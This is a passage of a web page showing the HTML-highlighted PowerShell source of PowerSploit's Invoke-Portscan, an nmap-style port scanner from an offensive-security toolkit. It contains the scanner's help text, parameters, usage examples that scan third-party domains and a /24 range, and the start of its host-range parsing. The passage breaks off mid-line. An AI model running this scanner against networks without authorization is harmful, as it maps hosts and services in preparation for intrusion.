class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Invoke-Portscan</span></span><br>&#123;<br><span class="hljs-comment">&lt;#</span><br><span class="hljs-comment"><span class="hljs-doctag">.SYNOPSIS</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Simple portscan module</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PowerSploit Function: Invoke-Portscan</span><br><span class="hljs-comment">Author: Rich Lundeen (http://webstersProdigy.net)</span><br><span class="hljs-comment">License: BSD 3-Clause</span><br><span class="hljs-comment">Required Dependencies: None</span><br><span class="hljs-comment">Optional Dependencies: None</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.DESCRIPTION</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Does a simple port scan using regular sockets, based (pretty) loosely on nmap</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER Hosts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Include these comma seperated hosts (supports IPv4 CIDR notation) or pipe them in</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER HostFile</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Input hosts from file rather than commandline</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER ExcludeHosts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Exclude these comma seperated hosts</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER Ports</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Include these comma seperated ports (can also be a range like 80-90)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER PortFile</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Input ports from a file</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER TopPorts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Include the x top ports - only goes to 1000, default is top 50</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER ExcludedPorts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Exclude these comma seperated ports</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER SkipDiscovery</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Treat all hosts as online, skip host discovery</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER PingOnly</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Ping scan only (disable port scan)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER DiscoveryPorts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Comma separated ports used for host discovery. -1 is a ping</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER Threads</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">number of max threads for the thread pool (per host)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER nHosts</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">number of hosts to concurrently scan</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER Timeout</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Timeout time on a connection in miliseconds before port is declared filtered</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER SleepTimer</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Wait before thread checking, in miliseconds</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER SyncFreq</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">How often (in terms of hosts) to sync threads and flush output</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER T</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">[0-5] shortcut performance options. Default is 3. higher is more aggressive. Sets (nhosts, threads,timeout)</span><br><span class="hljs-comment">    5 &#123;$nHosts=30;  $Threads = 1000; $Timeout = 750  &#125;</span><br><span class="hljs-comment">    4 &#123;$nHosts=25;  $Threads = 1000; $Timeout = 1200 &#125;</span><br><span class="hljs-comment">    3 &#123;$nHosts=20;  $Threads = 100;  $Timeout = 2500 &#125;</span><br><span class="hljs-comment">    2 &#123;$nHosts=15;  $Threads = 32;   $Timeout = 3000 &#125;</span><br><span class="hljs-comment">    1 &#123;$nHosts=10;  $Threads = 32;   $Timeout = 5000 &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER GrepOut</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Greppable output file</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER XmlOut</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">output XML file</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER ReadableOut</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">output file in &#x27;readable&#x27; format</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER AllformatsOut</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">output in readable (.nmap), xml (.xml), and greppable (.gnmap) formats</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER noProgressMeter</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Suppresses the progress meter</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER quiet</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">supresses returned output and don&#x27;t store hosts in memory - useful for very large scans</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER ForceOverwrite</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Force Overwrite if output Files exist. Otherwise it throws exception</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Invoke-Portscan -Hosts &quot;webstersprodigy.net,google.com,microsoft.com&quot; -TopPorts 50</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Description</span><br><span class="hljs-comment">-----------</span><br><span class="hljs-comment">Scans the top 50 ports for hosts found for webstersprodigy.net,google.com, and microsoft.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">echo webstersprodigy.net | Invoke-Portscan -oG test.gnmap -f -ports &quot;80,443,8080&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Description</span><br><span class="hljs-comment">-----------</span><br><span class="hljs-comment">Does a portscan of &quot;webstersprodigy.net&quot;, and writes a greppable output file</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -TopPorts 25 -oA localnet</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Description</span><br><span class="hljs-comment">-----------</span><br><span class="hljs-comment">Scans the top 20 ports for hosts found in the 192.168.1.1/24 range, outputs all file formats</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.LINK</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">http://webstersprodigy.net</span><br><span class="hljs-comment">#&gt;</span><br><br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSUseShouldProcessForStateChangingFunctions&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSUseSingularNouns&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSUseApprovedVerbs&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSShouldProcess&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    [<span class="hljs-type">Diagnostics.CodeAnalysis.SuppressMessageAttribute</span>(<span class="hljs-string">&#x27;PSUseLiteralInitializerForHashtable&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)]<br>    <span class="hljs-function">[<span class="hljs-type">CmdletBinding</span>()]</span><br>    <span class="hljs-keyword">Param</span> (<br>        <span class="hljs-comment">#Host, Ports</span><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;cmdHosts&quot;</span>,<br><br>                   <span class="hljs-type">ValueFromPipeline</span>=<span class="hljs-variable">$True</span>,<br>                   <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)]<br>                   [<span class="hljs-built_in">String</span>[]] <span class="hljs-variable">$Hosts</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;fHosts&quot;</span>,<br>                   <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;iL&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>]  <span class="hljs-variable">$HostFile</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;exclude&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$ExcludeHosts</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;p&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$Ports</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;iP&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$PortFile</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$TopPorts</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;xPorts&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$ExcludedPorts</span>,<br><br>        <span class="hljs-comment">#Host Discovery</span><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;Pn&quot;</span>)]<br>                   [<span class="hljs-type">Switch</span>] <span class="hljs-variable">$SkipDiscovery</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;sn&quot;</span>)]<br>                   [<span class="hljs-type">Switch</span>] <span class="hljs-variable">$PingOnly</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;PS&quot;</span>)]<br>                   [<span class="hljs-built_in">string</span>] <span class="hljs-variable">$DiscoveryPorts</span> = <span class="hljs-string">&quot;-1,445,80,443&quot;</span>,<br><br>        <span class="hljs-comment">#Timing and Performance</span><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$Threads</span> = <span class="hljs-number">100</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$nHosts</span> = <span class="hljs-number">25</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">2000</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$SleepTimer</span> = <span class="hljs-number">500</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$SyncFreq</span> = <span class="hljs-number">1024</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$T</span>,<br><br>        <span class="hljs-comment">#Output</span><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;oG&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$GrepOut</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;oX&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$XmlOut</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;oN&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$ReadableOut</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;oA&quot;</span>)]<br>                   [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$AllformatsOut</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Switch</span>] <span class="hljs-variable">$noProgressMeter</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;q&quot;</span>)]<br>                   [<span class="hljs-type">Switch</span>] <span class="hljs-variable">$quiet</span>,<br><br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$False</span>)]<br>                   [<span class="hljs-type">Alias</span>(<span class="hljs-string">&quot;F&quot;</span>)]<br>                   [<span class="hljs-type">Switch</span>] <span class="hljs-variable">$ForceOverwrite</span><br><br>        <span class="hljs-comment">#TODO add script parameter</span><br>        <span class="hljs-comment">#TODO add resume parameter</span><br>    )<br><br>    <span class="hljs-keyword">PROCESS</span> &#123;<br><br>        <span class="hljs-built_in">Set-StrictMode</span> <span class="hljs-literal">-Version</span> <span class="hljs-number">2.0</span><br><br>        <span class="hljs-variable">$version</span> = .<span class="hljs-number">13</span><br>        <span class="hljs-variable">$hostList</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br>        <span class="hljs-variable">$portList</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br>        <span class="hljs-variable">$hostPortList</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br><br>        <span class="hljs-variable">$scannedHostList</span> = <span class="hljs-selector-tag">@</span>()<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Parse-Hosts</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$Hosts</span><br>            )<br><br>            [<span class="hljs-built_in">String</span>[]] <span class="hljs-variable">$iHosts</span> = <span class="hljs-variable">$Hosts</span>.Split(<span class="hljs-string">&quot;,&quot;</span>)<br><br>            <span class="hljs-variable">$IPRangeRegex</span> = <span class="hljs-string">&quot;\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;-\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;&quot;</span><br><br>            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$iHost</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$iHosts</span>)<br>            &#123;<br>                <span class="hljs-variable">$iHost</span> = <span class="hljs-variable">$iHost</span>.Replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br>                <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$iHost</span>)<br>                &#123;<br>                    <span class="hljs-keyword">continue</span><br>                &#125;<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$iHost</span>.contains(<span class="hljs-string">&quot;/&quot;</span>))<br>                &#123;<br>                    <span class="hljs-variable">$netPart</span> = <span class="hljs-variable">$iHost</span>.split(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">0</span>]<br>                    [<span class="hljs-type">uint32</span>]<span class="hljs-variable">$maskPart</span> = <span class="hljs-variable">$iHost</span>.split(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">1</span>]<br><br>                    <span class="hljs-variable">$address</span> = [<span class="hljs-type">System.Net.IPAddress</span>]::Parse(<span class="hljs-variable">$netPart</span>)<br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$maskPart</span> <span class="hljs-operator">-ge</span> <span class="hljs-variable">$address</span>.GetAddressBytes().Length * <span class="hljs-number">8</span>)<br>                    &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Bad host mask&quot;</span><br>                    &#125;<br><br>                    <span class="hljs-variable">$numhosts</span> = [<span class="hljs-type">System.math</span>]::Pow(<span class="hljs-number">2</span>,((<span class="hljs-variable">$address</span>.GetAddressBytes().Length *<span class="hljs-number">8</span>) - <span class="hljs-variable">$maskPart</span>))<br><br>                    <span class="hljs-variable">$startaddress</span> = <span class="hljs-variable">$address</span>.GetAddressBytes()<br>                    [<span class="hljs-built_in">array</span>]::Reverse(<span class="hljs-variable">$startaddress</span>)<br><br>                    <span class="hljs-variable">$startaddress</span> = [<span class="hljs-type">System.BitConverter</span>]::ToUInt32(<span class="hljs-variable">$startaddress</span>, <span class="hljs-number">0</span>)<br>                    [<span class="hljs-type">uint32</span>]<span class="hljs-variable">$startMask</span> = ([<span class="hljs-type">System.math</span>]::Pow(<span class="hljs-number">2</span>, <span class="hljs-variable">$maskPart</span>)<span class="hljs-literal">-1</span>) * ([<span class="hljs-type">System.Math</span>]::Pow(<span class="hljs-number">2</span>,(<span class="hljs-number">32</span> - <span class="hljs-variable">$maskPart</span>)))<br>                    <span class="hljs-variable">$startAddress</span> = <span class="hljs-variable">$startAddress</span> <span class="hljs-operator">-band</span> <span class="hljs-variable">$startMask</span><br><br>                    <span class="hljs-comment">#in powershell 2.0 there are 4 0 bytes padded, so the [0..3] is necessary</span><br>                    <span class="hljs-variable">$startAddress</span> = [<span class="hljs-type">System.BitConverter</span>]::GetBytes(<span class="hljs-variable">$startaddress</span>)[<span class="hljs-number">0</span><span class="hljs-type">..3</span>]<br>                    [<span class="hljs-built_in">array</span>]::Reverse(<span class="hljs-variable">$startaddress</span>)<br><br>                    <span class="hljs-variable">$address</span> = [<span class="hljs-type">System.Net.IPAddress</span>] [<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$startAddress</span><br><br>                    <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$address</span>.IPAddressToString)<br><br>                    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> <span class="hljs-operator">-lt</span> <span class="hljs-variable">$numhosts</span><span class="hljs-literal">-1</span>; <span class="hljs-variable">$i</span>++)<br>                    &#123;<br><br>                        <span class="hljs-variable">$nextAddress</span> =  <span class="hljs-variable">$address</span>.GetAddressBytes()<br>                        [<span class="hljs-built_in">array</span>]::Reverse(<span class="hljs-variable">$nextAddress</span>)<br>                        <span class="hljs-variable">$nextAddress</span> =  [<span class="hljs-type">System.BitConverter</span>]::ToUInt32(<span class="hljs-variable">$nextAddress</span>, <span class="hljs-number">0</span>)<br>                        <span class="hljs-variable">$nextAddress</span> ++<br>                        <span class="hljs-variable">$nextAddress</span> = [<span class="hljs-type">System.BitConverter</span>]::GetBytes(<span class="hljs-variable">$nextAddress</span>)[<span class="hljs-number">0</span><span class="hljs-type">..3</span>]<br>                        [<span class="hljs-built_in">array</span>]::Reverse(<span class="hljs-variable">$nextAddress</span>)<br><br>                        <span class="hljs-variable">$address</span> = [<span class="hljs-type">System.Net.IPAddress</span>] [<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$nextAddress</span><br>                        <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$address</span>.IPAddressToString)<br><br>                    &#125;<br><br>                &#125;<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$iHost</span> <span class="hljs-operator">-match</span> <span class="hljs-variable">$IPRangeRegex</span>)<br>                &#123;<br><br>                <span class="hljs-variable">$iHostPart1</span> = (<span class="hljs-variable">$iHost</span>.Split(<span class="hljs-string">&quot;-&quot;</span>))[<span class="hljs-number">0</span>]<br>                <span class="hljs-variable">$iHostPart2</span> = (<span class="hljs-variable">$iHost</span>.Split(<span class="hljs-string">&quot;-&quot;</span>))[<span class="hljs-number">1</span>]<br><br>                <span class="hljs-variable">$LowerBound</span> = <span class="hljs-variable">$iHostPart1</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)<br>                <span class="hljs-variable">$UpperBound</span> = <span class="hljs-variable">$iHostPart2</span>.Split(<span class="hljs-string">&quot;.&quot;</span>)<br><br>                <span class="hljs-variable">$LowerBoundInt</span> = (<span class="hljs-variable">$LowerBound</span>[<span class="hljs-number">0</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$LowerBound</span>[<span class="hljs-number">1</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$LowerBound</span>[<span class="hljs-number">2</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$LowerBound</span>[<span class="hljs-number">3</span>].ToInt32(<span class="hljs-variable">$null</span>))<br>                <span class="hljs-variable">$UpperBoundInt</span> = (<span class="hljs-variable">$UpperBound</span>[<span class="hljs-number">0</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$UpperBound</span>[<span class="hljs-number">1</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$UpperBound</span>[<span class="hljs-number">2</span>].ToInt32(<span class="hljs-variable">$null</span>),<span class="hljs-variable">$UpperBound</span>[<span class="hljs-number">3</span>].ToInt32(<span class="hljs-variable">$null</span>))<br><br>                <span class="hljs-variable">$CurrentIP</span> = <span class="hljs-variable">$LowerBoundInt</span><br>                <span class="hljs-variable">$CurrentIPString</span> = <span class="hljs-variable">$null</span><br>                <span class="hljs-variable">$ControlArray</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br><br>                <span class="hljs-variable">$null</span> = <span class="hljs-variable">$hostList</span>.Add(<span class="hljs-variable">$iHostPart1</span>)<br><br>                    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$CurrentIPString</span> <span class="hljs-operator">-ne</span> <span class="hljs-variable">$iHostPart2</span>)<br>                    &#123;<br>                        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> <span class="hljs-operator">-lt</span> <span class="hljs-number">4</span>;<span class="hljs-variable">$i</span>++)<br>                        &#123;<br><br>                            <span class="hljs-keyword">if</span>((<span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>] <span class="hljs-operator">-eq</span> <span class="hljs-variable">$UpperBoundInt</span>[<span class="hljs-variable">$i</span>]) <span class="hljs-operator">-and</span> ((<span class="hljs-variable">$i</span> <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span>) <span class="hljs-operator">-or</span> <span class="hljs-variable">$ControlArray</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">1</span>] <span class="hljs-operator">-eq</span> <span class="hljs-number">1</span>))<br>                            &#123;<br>                                <span class="hljs-variable">$ControlArray</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-number">1</span><br>                                <span class="hljs-keyword">continue</span><br>                            &#125;<br>                            <span class="hljs-keyword">else</span><br>                            &#123;<br><br>                                <span class="hljs-variable">$Max</span> = <span class="hljs-number">254</span><br>                                <span class="hljs-keyword">if</span>((<span class="hljs-variable">$i</span> <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>) <span class="hljs-operator">-and</span> (<span class="hljs-variable">$ControlArray</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">1</span>] <span class="hljs-operator">-eq</span> <span class="hljs-number">1</span>))<br>                                &#123;<br>                                    <span class="hljs-variable">$Max</span> = <span class="hljs-variable">$UpperBoundInt</span>[<span class="hljs-variable">$i</span>]<br>                                &#125;<br><br>                                <span class="hljs-keyword">if</span>((<span class="hljs-variable">$i</span> <span class="hljs-operator">-ne</span> <span class="hljs-number">3</span>) <span class="hljs-operator">-and</span> (<span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>] <span class="hljs-operator">-eq</span> <span class="hljs-number">254</span>))<br>                                &#123;<br>                                    <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>]++<br>                                    <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>]=<span class="hljs-number">0</span><br><br>                                    <span class="hljs-variable">$CurrentIPString</span> = (<span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">0</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">1</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">2</span>].ToString() + <span class="hljs-string">&quot;.&quot;</span> + <span class="hljs-variable">$CurrentIP</span>[<span class="hljs-number">3</span>].ToString())<br>                                    <span class="hljs-variable">$null</span> = <span class="hljs-variable">$hostList</span>.Add(<span 